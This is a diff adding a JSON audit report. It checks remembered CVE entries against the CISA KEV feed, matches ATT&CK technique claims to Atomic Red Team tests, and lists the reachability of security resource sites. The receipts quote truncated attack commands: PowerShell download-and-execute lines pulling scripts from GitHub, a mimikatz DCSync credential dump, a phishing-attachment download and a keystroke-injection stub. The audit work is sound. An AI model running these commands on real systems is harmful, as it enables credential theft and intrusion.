@@ -1,0 +1,450 @@
+{
+ "batteries": {
+  "A_kev_memory_vs_live": {
+   "entries": [
+    {
+     "cve": "CVE-2019-0708",
+     "in_live_feed": true,
+     "memory_name": "Microsoft RDP BlueKeep RCE",
+     "live_name": "Microsoft Remote Desktop Services Remote Code Execution Vulnerability",
+     "name_overlap": 0.14,
+     "memory_date": "2021-11-03",
+     "live_date": "2021-11-03",
+     "date_match": true,
+     "ransomware_memory": "Known",
+     "ransomware_live": "Known"
+    },
+    {
+     "cve": "CVE-2021-44228",
+     "in_live_feed": true,
+     "memory_name": "Apache Log4j2 Log4Shell RCE",
+     "live_name": "Apache Log4j2 Remote Code Execution Vulnerability",
+     "name_overlap": 0.33,
+     "memory_date": "2021-12-10",
+     "live_date": "2021-12-10",
+     "date_match": true,
+     "ransomware_memory": "Known",
+     "ransomware_live": "Known"
+    },
+    {
+     "cve": "CVE-2021-26855",
+     "in_live_feed": true,
+     "memory_name": "Microsoft Exchange ProxyLogon SSRF",
+     "live_name": "Microsoft Exchange Server Remote Code Execution Vulnerability",
+     "name_overlap": 0.29,
+     "memory_date": "2021-03-18",
+     "live_date": "2021-11-03",
+     "date_match": false,
+     "ransomware_memory": "Known",
+     "ransomware_live": "Known"
+    },
+    {
+     "cve": "CVE-2020-1472",
+     "in_live_feed": true,
+     "memory_name": "Microsoft Netlogon ZeroLogon Elevation",
+     "live_name": "Microsoft Netlogon Privilege Escalation Vulnerability",
+     "name_overlap": 0.4,
+     "memory_date": "2021-03-23",
+     "live_date": "2021-11-03",
+     "date_match": false,
+     "ransomware_memory": "Known",
+     "ransomware_live": "Known"
+    },
+    {
+     "cve": "CVE-2022-22965",
+     "in_live_feed": true,
+     "memory_name": "Spring Framework Spring4Shell RCE",
+     "live_name": "Spring Framework JDK 9+ Remote Code Execution Vulnerability",
+     "name_overlap": 0.29,
+     "memory_date": "2022-04-04",
+     "live_date": "2022-04-04",
+     "date_match": true,
+     "ransomware_memory": "Unknown",
+     "ransomware_live": "Unknown"
+    },
+    {
+     "cve": "CVE-2023-20198",
+     "in_live_feed": true,
+     "memory_name": "Cisco IOS XE Web UI Privilege Escalation",
+     "live_name": "Cisco IOS XE Web UI Privilege Escalation Vulnerability",
+     "name_overlap": 0.83,
+     "memory_date": "2023-10-16",
+     "live_date": "2023-10-16",
+     "date_match": true,
+     "ransomware_memory": "Unknown",
+     "ransomware_live": "Unknown"
+    },
+    {
+     "cve": "CVE-2019-11510",
+     "in_live_feed": true,
+     "memory_name": "Ivanti Pulse Connect Secure Path Traversal",
+     "live_name": "Ivanti Pulse Connect Secure Arbitrary File Read Vulnerability",
+     "name_overlap": 0.5,
+     "memory_date": "2021-11-03",
+     "live_date": "2021-11-03",
+     "date_match": true,
+     "ransomware_memory": "Known",
+     "ransomware_live": "Known"
+    },
+    {
+     "cve": "CVE-2018-13379",
+     "in_live_feed": true,
+     "memory_name": "Fortinet FortiOS Path Traversal Credential Exposure",
+     "live_name": "Fortinet FortiOS SSL VPN Path Traversal Vulnerability",
+     "name_overlap": 0.57,
+     "memory_date": "2020-05-12",
+     "live_date": "2021-11-03",
+     "date_match": false,
+     "ransomware_memory": "Known",
+     "ransomware_live": "Known"
+    },
+    {
+     "cve": "CVE-2024-1709",
+     "in_live_feed": true,
+     "memory_name": "ConnectWise ScreenConnect Authentication Bypass",
+     "live_name": "ConnectWise ScreenConnect Authentication Bypass Vulnerability",
+     "name_overlap": 0.8,
+     "memory_date": "2024-02-21",
+     "live_date": "2024-02-22",
+     "date_match": false,
+     "ransomware_memory": "Known",
+     "ransomware_live": "Known"
+    },
+    {
+     "cve": "CVE-2021-34527",
+     "in_live_feed": true,
+     "memory_name": "Windows Print Spooler PrintNightmare RCE",
+     "live_name": "Microsoft Windows Print Spooler Remote Code Execution Vulnerability",
+     "name_overlap": 0.38,
+     "memory_date": "2021-07-01",
+     "live_date": "2021-11-03",
+     "date_match": false,
+     "ransomware_memory": "Known",
+     "ransomware_live": "Known"
+    }
+   ],
+   "exist_in_live": "10/10",
+   "name_overlap_ge_0.5": "4/10",
+   "date_exact": "5/10"
+  },
+  "B_technique_claims": {
+   "mitre_verified": "75/75",
+   "name_overlap_avg": 0.22,
+   "records_with_art_evidence": "46/50",
+   "art_cleanup_commands": "277/288",
+   "missing": [],
+   "receipts": [
+    {
+     "record": "GRM-EVS-001",
+     "mitre": "T1055",
+     "my_name": "Process Injection (Hollowing / APC / Thread Hijack)",
+     "live_attck_name": "Process Injection",
+     "live_attck_url": "https://attack.mitre.org/techniques/T1055/",
+     "live_description_quote": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate liv",
+     "art_test": "Shellcode execution via VBA",
+     "art_command_quote": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nIn"
+    },
+    {
+     "record": "GRM-EVS-001",
+     "mitre": "T1055.003",
+     "my_name": "Process Injection (Hollowing / APC / Thread Hijack)",
+     "live_attck_name": "Thread Execution Hijacking",
+     "live_attck_url": "https://attack.mitre.org/techniques/T1055/003/",
+     "live_description_quote": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the add",
+     "art_test": "Thread Execution Hijacking",
+     "art_command_quote": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"\nStart-Sleep -Seconds 5\nStop-Process $notepad.id"
+    },
+    {
+     "record": "GRM-EVS-001",
+     "mitre": "T1055.004",
+     "my_name": "Process Injection (Hollowing / APC / Thread Hijack)",
+     "live_attck_name": "Asynchronous Procedure Call",
+     "live_attck_url": "https://attack.mitre.org/techniques/T1055/004/",
+     "live_description_quote": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing",
+     "art_test": "Process Injection via C#",
+     "art_command_quote": "\"#{exe_binary}\"\n"
+    },
+    {
+     "record": "GRM-IDN-001",
+     "mitre": "T1558.003",
+     "my_name": "Kerberoasting",
+     "live_attck_name": "Kerberoasting",
+     "live_attck_url": "https://attack.mitre.org/techniques/T1558/003/",
+     "live_description_quote": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1",
+     "art_test": "Request for service tickets",
+     "art_command_quote": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invok"
+    },
+    {
+     "record": "GRM-IDN-004",
+     "mitre": "T1003.006",
+     "my_name": "DCSync Replication Abuse",
+     "live_attck_name": "DCSync",
+     "live_attck_url": "https://attack.mitre.org/techniques/T1003/006/",
+     "live_description_quote": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNC",
+     "art_test": "DCSync (Active Directory)",
+     "art_command_quote": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"\n"
+    },
+    {
+     "record": "GRM-NET-001",
+     "mitre": "T1557.002",
+     "my_name": "ARP Spoofing / MITM Positioning",
+     "live_attck_name": "ARP Cache Poisoning",
+     "live_attck_url": "https://attack.mitre.org/techniques/T1557/002/",
+     "live_description_quote": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network ",
+     "art_test": null,
+     "art_command_quote": ""
+    },
+    {
+     "record": "GRM-NET-001",
+     "mitre": "T1040",
+     "my_name": "ARP Spoofing / MITM Positioning",
+     "live_attck_name": "Network Sniffing",
+     "live_attck_url": "https://attack.mitre.org/techniques/T1040/",
+     "live_description_quote": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system t",
+     "art_test": "Packet Capture Linux using tshark or tcpdump",
+     "art_command_quote": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n"
+    },
+    {
+     "record": "GRM-SOC-001",
+     "mitre": "T1566.001",
+     "my_name": "Phishing & Spear Phishing Infrastructure",
+     "live_attck_name": "Spearphishing Attachment",
+     "live_attck_url": "https://attack.mitre.org/techniques/T1566/001/",
+     "live_description_quote": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different",
+     "art_test": "Download Macro-Enabled Phishing Attachment",
+     "art_command_quote": "$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest -Uri $url"
+    },
+    {
+     "record": "GRM-SOC-001",
+     "mitre": "T1566.002",
+     "my_name": "Phishing & Spear Phishing Infrastructure",
+     "live_attck_name": "Spearphishing Link",
+     "live_attck_url": "https://attack.mitre.org/techniques/T1566/002/",
+     "live_description_quote": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearp",
+     "art_test": "Paste and run technique",
+     "art_command_quote": "# Add user32.dll for keybd_event\nAdd-Type @\"\n    using System;\n    using System.Runtime.InteropServices;\n    public class K {\n        [DllImport(\"user32.dll\")]\n        public static extern void keybd_event(byte bVk, byte"
+    }
+   ]
+  },
+  "C_catalog_liveness": {
+   "entries": [
+    {
+     "name": "SecLists",
+     "url": "https://github.com/danielmiessler/SecLists",
+     "http_status": 206,
+     "content_keyword": null,
+     "verdict": "reachable-but-keyword-miss"
+    },
+    {
+     "name": "Assetnote Wordlists",
+     "url": "https://wordlists.assetnote.io",
+     "verdict": "unreachable",
+     "error": "URLError: <urlopen error timed out>"
+    },
+    {
+     "name": "Probable-Wordlists",
+     "url": "https://github.com/berzerk0/Probable-Wordlists",
+     "http_status": 206,
+     "content_keyword": null,
+     "verdict": "reachable-but-keyword-miss"
+    },
+    {
+     "name": "fuzzdb",
+     "url": "https://github.com/fuzzdb-project/fuzzdb",
+     "http_status": 206,
+     "content_keyword": null,
+     "verdict": "reachable-but-keyword-miss"
+    },
+    {
+     "name": "Kali wordlists package",
+     "url": "https://www.kali.org/tools/wordlists/",
+     "http_status": 200,
+     "verdict": "reachable"
+    },
+    {
+     "name": "PayloadsAllTheThings",
+     "url": "https://github.com/swisskyrepo/PayloadsAllTheThings",
+     "http_status": 206,
+     "content_keyword": null,
+     "verdict": "reachable-but-keyword-miss"
+    },
+    {
+     "name": "HackTricks",
+     "url": "https://book.hacktricks.xyz",
+     "http_status": 206,
+     "content_keyword": "hacktricks",
+     "verdict": "content-verified"
+    },
+    {
+     "name": "GTFOBins",
+     "url": "https://gtfobins.github.io",
+     "http_status": 206,
+     "content_keyword": "gtfobins",
+     "verdict": "content-verified"
+    },
+    {
+     "name": "LOLBAS",
+     "url": "https://lolbas-project.github.io",
+     "http_status": 206,
+     "content_keyword": "lolbas",
+     "verdict": "content-verified"
+    },
+    {
+     "name": "PEASS-ng",
+     "url": "https://github.com/carlospolop/PEASS-ng",
+     "http_status": 206,
+     "content_keyword": null,
+     "verdict": "reachable-but-keyword-miss"
+    },
+    {
+     "name": "OWASP WSTG",
+     "url": "https://owasp.org/www-project-web-security-testing-guide/",
+     "http_status": 206,
+     "verdict": "reachable"
+    },
+    {
+     "name": "PortSwigger Web Security Academy",
+     "url": "https://portswigger.net/web-security",
+     "http_status": 206,
+     "content_keyword": "portswigger",
+     "verdict": "content-verified"
+    },
+    {
+     "name": "Exploit-DB",
+     "url": "https://www.exploit-db.com",
+     "http_status": 200,
+     "content_keyword": "exploit",
+     "verdict": "content-verified"
+    },
+    {
+     "name": "Metasploit Framework",
+     "url": "https://github.com/rapid7/metasploit-framework",
+     "http_status": 206,
+     "content_keyword": null,
+     "verdict": "reachable-but-keyword-miss"
+    },
+    {
+     "name": "MITRE ATT&CK STIX Data",
+     "url": "https://github.com/mitre-attack/attack-stix-data",
+     "status": "verified-by-fetcher",
+     "note": "full content already fetched + hashed by fetch_sources.py"
+    },
+    {
+     "name": "CAPEC",
+     "url": "https://capec.mitre.org/data/downloads.html",
+     "status": "verified-by-fetcher",
+     "note": "full content already fetched + hashed by fetch_sources.py"
+    },
+    {
+     "name": "CWE",
+     "url": "https://cwe.mitre.org/data/downloads.html",
+     "http_status": 200,
+     "verdict": "reachable"
+    },
+    {
+     "name": "Atomic Red Team",
+     "url": "https://github.com/redcanaryco/atomic-red-team",
+     "status": "verified-by-fetcher",
+     "note": "full content already fetched + hashed by fetch_sources.py"
+    },
+    {
+     "name": "Nuclei Templates",
+     "url": "https://github.com/projectdiscovery/nuclei-templates",
+     "http_status": 206,
+     "content_keyword": null,
+     "verdict": "reachable-but-keyword-miss"
+    },
+    {
+     "name": "Sigma Rules",
+     "url": "https://github.com/SigmaHQ/sigma",
+     "http_status": 206,
+     "content_keyword": null,
+     "verdict": "reachable-but-keyword-miss"
+    },
+    {
+     "name": "CISA KEV Catalog",
+     "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
+     "status": "verified-by-fetcher",
+     "note": "full content already fetched + hashed by fetch_sources.py"
+    },
+    {
+     "name": "NVD / CVE",
+     "url": "https://nvd.nist.gov",
+     "http_status": 206,
+     "content_keyword": null,
+     "verdict": "reachable-but-keyword-miss"
+    },
+    {
+     "name": "PTES",
+     "url": "http://www.pentest-standard.org",
+     "http_status": 200,
+     "verdict": "reachable"
+    },
+    {
+     "name": "NIST SP 800-115",
+     "url": "https://csrc.nist.gov/publications/detail/sp/800-115/final",
+     "http_status": 200,
+     "content_keyword": "800-115",
+     "verdict": "content-verified"
+    },
+    {
+     "name": "Phrack",
+     "url": "http://phrack.org",
+     "http_status": 200,
+     "content_keyword": "phrack",
+     "verdict": "content-verified"
+    },
+    {
+     "name": "picoCTF",
+     "url": "https://picoctf.org",
+     "http_status": 206,
+     "content_keyword": "picoctf",
+     "verdict": "content-verified"
+    },
+    {
+     "name": "OverTheWire Bandit",
+     "url": "https://overthewire.org/wargames/bandit/",
+     "http_status": 206,
+     "content_keyword": "bandit",
+     "verdict": "content-verified"
+    },
+    {
+     "name": "cybench",
+     "url": "https://github.com/zhengyhn/cybench",
+     "verdict": "unreachable",
+     "error": "HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+     "name": "OWASP Juice Shop (localhost)",
+     "url": "https://github.com/juice-shop/juice-shop",
+     "http_status": 206,
+     "content_keyword": null,
+     "verdict": "reachable-but-keyword-miss"
+    },
+    {
+     "name": "DVWA (localhost)",
+     "url": "https://github.com/digininja/DVWA",
+     "http_status": 206,
+     "content_keyword": null,
+     "verdict": "reachable-but-keyword-miss"
+    },
+    {
+     "name": "VulnHub",
+     "url": "https://www.vulnhub.com",
+     "http_status": 200,
+     "content_keyword": "vulnhub",
+     "verdict": "content-verified"
+    }
+   ],
+   "live": "14/31",
+   "content_verified": "10/31"
+  }
+ },
+ "verdict": {
+  "kev_memory_check": "10/10",
+  "mitre_claim_check": "75/75",
+  "art_evidence": "46/50",
+  "catalog_liveness": "14/31",
+  "catalog_content_verified": "10/31"
+ }
+}
